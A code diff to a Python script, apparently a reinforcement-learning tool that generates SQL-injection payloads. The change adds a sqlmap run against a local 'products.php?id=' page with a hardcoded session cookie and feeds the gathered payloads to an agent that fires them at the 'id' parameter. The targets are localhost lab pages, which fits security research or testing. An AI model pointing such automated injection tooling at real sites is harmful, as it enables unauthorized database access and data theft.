@@ -1,12 +1,17 @@
 #!/usr/local/bin/python
+import sys
 import numpy as np
 import requests
+from sqlmap_runner import SqlmapRunner
 from model.initial_transitions_factory import InitialTransitionsFactory
 from sql_parser.token_parser import TokenParser
 from sql_parser.sql_data_service import SQLDataService
 from model.token_embedder import TokenEmbedder 
 from model.ddpg import DDPG
 from model.environment import Environment
+
+args = sys.argv[1:]
+run_sqlmap = '--no-sqlmap' not in args
 
 #
 #
@@ -28,7 +33,8 @@ ACTION_SIZE = 10
 # the prefix of a state.
 STATE_SIZE = ACTION_SIZE * EMBEDDING_DIM + 500
 
-IP = 'localhost'
+OPEN_URL = 'http://localhost/products.php?id='
+COOKIE = 'pma_lang=en; PHPSESSID=9cde755c26180d12c37c82fb3c0ecb5e; {flag}=795c7a7a5ec6b460ec00c5841019b9e9'
 
 # TODO: Ensure token parser checks for empty string instead of assuming
 # its position at end of descending list.
@@ -41,6 +47,15 @@ PADDING_TOKEN = ''
 visible_uppercase_chars = [chr(i) for i in range(32, 97)] + \
     [chr(i) for i in range(123, 127)]
 
+sqlmap = SqlmapRunner(OPEN_URL, vulernable_param='id', default_vulnerable_param_value='1')
+
+if run_sqlmap:
+    print('Running sqlmap...')
+    sqlmap.run(COOKIE)
+    print('Attempted payloads gathered from sqlmap.')
+else:
+    print('Skipping sqlmap...')
+
 data_service = SQLDataService()
 
 columns = data_service.load_columns()
@@ -50,7 +65,7 @@ sql_tokens = data_service.load_sql_tokens()
 token_blacklist = data_service.load_sql_blacklist()
 
 queries = data_service.load_wikisql_queries()
-payloads = data_service.load_payload_files(IP)
+payloads = data_service.load_payload_files(sqlmap.domain_name)
 
 dictionary = [PADDING_TOKEN] + sql_tokens + tables + columns + visible_uppercase_chars
 
@@ -86,15 +101,10 @@ environment = Environment(
     columns=columns,
     tables=tables,
     send_request_callback= lambda payload:
-        requests.get(f'http://{IP}/products.php?id={payload}', headers={
+        requests.get(OPEN_URL + payload, headers={
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
-            'cookie': 'pma_lang=en; PHPSESSID=9cde755c26180d12c37c82fb3c0ecb5e; {flag}=795c7a7a5ec6b460ec00c5841019b9e9'
+            'cookie': COOKIE
         }))
-        #requests.post(f'http://localhost:3000/rest/product/search',data={'q': payload})
-        #requests.post('http://localhost:3000/rest/user/login', data={
-        #    'email': payload
-        #})
-        # requests.get(f'http://127.0.0.1:5000/pages?prodLine={payload}')
                                          
 state: np.ndarray
 
